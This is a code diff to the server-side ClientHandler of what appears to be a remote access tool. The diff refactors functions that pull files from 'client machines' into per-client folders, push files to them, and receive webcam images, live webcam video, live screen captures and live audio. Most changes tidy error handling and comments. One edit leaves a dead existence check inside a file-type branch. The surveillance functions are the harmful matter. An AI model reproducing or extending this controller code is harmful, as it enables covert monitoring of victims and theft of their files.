@@ -21,18 +21,18 @@ from IPython.display import clear_output
 class ClientHandler:
 
 
-        # sends file from server to client machine
+        # send file from server to client machine
         def send_file(self, conn, usrFile):
-            try:
+            if os.path.isfile(usrFile):
                 if not os.path.exists(usrFile):
-                    print("[-]File does not exist!!!")
-                    conn.send(str(" ").encode()) # get client current working directory
+                    print("[-]File does not exist!")
+                    conn.send(str(0).encode()) 
                 else:
                     fileSize = os.path.getsize(usrFile)
                     conn.send(str(fileSize).encode())
-                    time.sleep(2)
+                    time.sleep(1)
                     if fileSize == 0:
-                        print("[-]File is empty!!!")
+                        print("[-] File is empty!!!")
                         conn.send(str(" ").encode())
                     else:
                         with open(usrFile, 'rb') as file:
@@ -44,22 +44,26 @@ class ClientHandler:
                                 while data:
                                     conn.send(data)
                                     data = file.read(1024)
-                                file.close()
-            except:
-                print("[-]Unable to send file!!!")
+            elif os.path.isdir(usrFile):
+                print(f"[-]{usrFile} is a directory, not a file!")
+                conn.send(str(0).encode())
+            else:
+                print(f"[-]{usrFile} is not a regular file!")
+                conn.send(str(0).encode())
 
 
 
-        # recieves file from client machine
+        # receive file from client machine
         def receive_file(self, conn, client_folder, client_id, usrFile):
-            usrFile = os.path.join(client_folder, client_id, usrFile)
+            filepath = os.path.join(client_folder, client_id, usrFile)
+            print(filepath)
 
             try:   
                 fileSize = int(conn.recv(1024).decode())
                 if fileSize == 0:
                     print("File is empty!!!")
                 else:
-                    with open(usrFile, 'wb') as file:
+                    with open(filepath, 'wb') as file:
                         if fileSize < 1024:
                             data = conn.recv(1024)
                             file.write(data)
@@ -73,14 +77,13 @@ class ClientHandler:
                                 file.write(data)
                                 data = conn.recv(1024)
                             file.write(data)
-                            file.close()
                             print("[+]File received!!!")
-            except:
+            except Exception as e:
                 print("[-]Unable to receive file!!!")
+                print(e)
 
 
-
-        # receives images from the client machine
+        # receive images from the client machine
         def receive_client_image(self, client_folder, client_id, client_sock_object):
             try:
                 image_name = client_sock_object.recv(1024).decode()
@@ -112,8 +115,7 @@ class ClientHandler:
                 payload_size = struct.calcsize(">L")
                 print("[+] Press q to quit...")
 
-                try:
-                       
+                try:    
                     while len(cam_data) < payload_size:   
 
                             cam_data += conn.recv(4096)
@@ -154,7 +156,7 @@ class ClientHandler:
 
 
 
-        # receives live screen feed from client, outputs recording live on screen and writes stream to client folder
+        # receive live screen feed from client, outputs recording live on screen and writes stream to client folder
         def live_screen_feed(self, conn):
             data = b""
             msg_size = ""
@@ -201,7 +203,7 @@ class ClientHandler:
 
 
 
-        # receives live audio from client, outputs recording live and write stream to client folder
+        # receive live audio from client, outputs recording live and write stream to client folder
         def live_audio_feed(self, conn, client_folder, client_id):
             current_datetime = datetime.now()
             formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
